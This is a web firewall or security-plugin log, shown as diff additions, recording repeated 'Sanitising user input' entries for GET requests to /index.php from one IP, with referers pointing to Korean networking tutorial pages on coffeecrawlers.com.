+30/Sep/25 22:16:01  #5651351  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+30/Sep/25 22:16:32  #3164850  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:16:34  #8622687  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:16:35  #4076877  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:16:39  #6818416  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:16:52  #3186250  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:16:54  #1357528  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:17:07  #7931034  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:17:15  #7261680  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:18:15  #3870916  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+30/Sep/25 22:18:19  #7480722  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+30/Sep/25 22:19:43  #6413901  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:20:12  #2557153  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:20:29  #3899497  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:20:30  #5735602  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+30/Sep/25 22:20:37  #7220535  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:20:38  #2722268  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+30/Sep/25 22:21:05  #7670568  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:21:05  #4263785  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+30/Sep/25 22:21:35  #6930536  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:21:36  #6463329  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+30/Sep/25 22:23:08  #7235540  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:23:09  #7987743  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+30/Sep/25 22:23:19  #6729251  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+30/Sep/25 22:23:50  #4496601  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:23:51  #1324916  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+30/Sep/25 22:23:52  #7159770  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+30/Sep/25 22:23:55  #4878787  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+30/Sep/25 22:24:15  #4402416  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+30/Sep/25 22:27:14  #8213715  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 22:28:13  #5686584  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-2-%ec%bb%b4%ed%93%a8%ed%84%b0-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac%ec%9d%98-%ea%b5%ac%eb%b6%84/] - coffeecrawlers.com 
+
+30/Sep/25 22:28:22  #1339749  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-2-%ec%bb%b4%ed%93%a8%ed%84%b0-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac%ec%9d%98-%ea%b5%ac%eb%b6%84/] - coffeecrawlers.com 
+
+30/Sep/25 22:28:35  #3303307  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-2-%ec%bb%b4%ed%93%a8%ed%84%b0-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac%ec%9d%98-%ea%b5%ac%eb%b6%84/] - coffeecrawlers.com 
+
+30/Sep/25 22:28:47  #5875951  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+30/Sep/25 22:28:55  #3771714  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+30/Sep/25 22:39:17  #4091934  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/] - coffeecrawlers.com 
+
+30/Sep/25 22:42:41  #6437427  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/] - coffeecrawlers.com 
+
+30/Sep/25 22:58:32  #4836553  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/] - coffeecrawlers.com 
+
+30/Sep/25 23:01:13  #1278135  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/] - coffeecrawlers.com 
+
+30/Sep/25 23:12:51  #6111705  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 23:24:21  #5718581  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+30/Sep/25 23:25:03  #6500185  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+30/Sep/25 23:26:55  #8927378  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 23:32:27  #4961484  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 23:32:27  #3216493  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+30/Sep/25 23:52:19  #4161248  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+30/Sep/25 23:52:19  #3563731  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+30/Sep/25 23:52:27  #6480700  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+30/Sep/25 23:52:35  #2035479  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com  
